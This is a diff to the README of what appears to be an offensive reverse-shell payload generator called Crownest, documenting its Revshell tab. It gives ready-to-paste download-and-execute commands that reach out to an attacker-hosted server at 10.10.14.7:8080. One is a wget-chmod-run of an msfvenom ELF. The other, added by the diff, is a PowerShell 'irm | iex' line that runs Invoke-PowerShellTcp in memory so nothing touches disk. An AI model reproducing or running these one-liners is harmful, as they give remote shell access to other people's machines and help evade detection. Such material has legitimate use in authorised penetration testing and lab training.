@@ -74,9 +74,9 @@ URL appears in the bar up top, ready to copy. Watch hits arrive in the live HTTP
 ### 🧬 Revshell tab — generate, host, and get the run command
 
 Pick the **Target OS** and **Shell**, choose a **Payload type** (revshells, MSFVenom, or a
-script template), set **LHOST/LPORT**, and hit **Generate**. Crownest builds the payload,
-hosts it, and shows the **Execute suggestion**, a copy-paste download-and-execute command
-for the target. Click any hosted payload later to bring its suggestion back up.
+PowerShell script template), set **LHOST/LPORT**, and hit **Generate**. Crownest builds the
+payload, hosts it, and shows the **Execute suggestion**, a copy-paste download-and-execute
+command for the target. Click any hosted payload later to bring its suggestion back up.
 
 <div align="center">
 <img src="assets/screenshot-revshell.png" alt="Generating a payload" width="820">
@@ -85,6 +85,11 @@ for the target. Click any hosted payload later to bring its suggestion back up.
 > **Example:** generate a Linux `msfvenom` ELF and Crownest hands you
 > `wget http://10.10.14.7:8080/reverse.elf -O /tmp/reverse.elf; chmod +x /tmp/reverse.elf && /tmp/reverse.elf`
 > — paste it on the target, catch the shell.
+
+> **Windows one-liner:** the bundled `Invoke-PowerShellTcp.ps1` template ships in the jar
+> and is seeded on first run. Pick it, set LHOST/LPORT, Generate. Crownest bakes the
+> function call in and hands you `irm http://10.10.14.7:8080/Invoke-PowerShellTcp.ps1 | iex`
+> — it loads and fires the reverse shell in memory, nothing touches disk.
 
 ### ⚙️ Settings menu (top-left)
 
